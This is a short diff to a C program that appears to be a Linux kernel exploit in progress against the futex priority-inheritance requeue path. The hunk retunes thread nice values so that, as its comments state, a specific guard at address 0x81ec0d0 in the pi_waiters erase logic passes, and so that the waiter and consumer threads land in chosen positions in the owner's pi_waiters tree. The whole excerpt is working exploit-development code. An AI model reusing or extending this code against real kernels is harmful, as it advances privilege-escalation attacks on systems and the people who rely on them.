@@ -218,14 +218,15 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_ready, 1);
   while (!atomic_load(&owner_started)) usleep(1000);
 
-  /* Phase 1: boost waiter priority to nice=-20 (priority 100) so that
-   * rt_mutex_adjust_prio_chain during FUTEX_CMP_REQUEUE_PI sees
-   * waiter(100) > owner(120) and adds the waiter to owner's pi_waiters
-   * tree via pi_tree_entry.  This is the single-variable change for
-   * Phase 1 — consumer, NFDS unchanged. */
-  pr_info("waiter: boosting priority nice=-20 for PI chain test\n");
-  if (sched_setattr_tid(tid, -20) == 0)
-    pr_info("waiter: priority boosted to nice=-20 (tid=%d)\n", tid);
+  /* Phase 4: priority stratification for pi_waiters erase guard.
+   * Requeued waiter: nice=-10 (prio 110) → enters owner's pi_waiters
+   *   during requeue (110 < owner's 120).
+   * Consumer: nice=-20 (prio 100) → becomes leftmost in waiter tree
+   *   (100 < waiter's 110), so guard at 0x81ec0d0 passes:
+   *   leftmost(consumer) == task->pi_blocked_on(consumer). */
+  pr_info("waiter: boosting priority nice=-10 for PI chain (prio 110)\n");
+  if (sched_setattr_tid(tid, -10) == 0)
+    pr_info("waiter: priority boosted to nice=-10 (tid=%d)\n", tid);
 
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
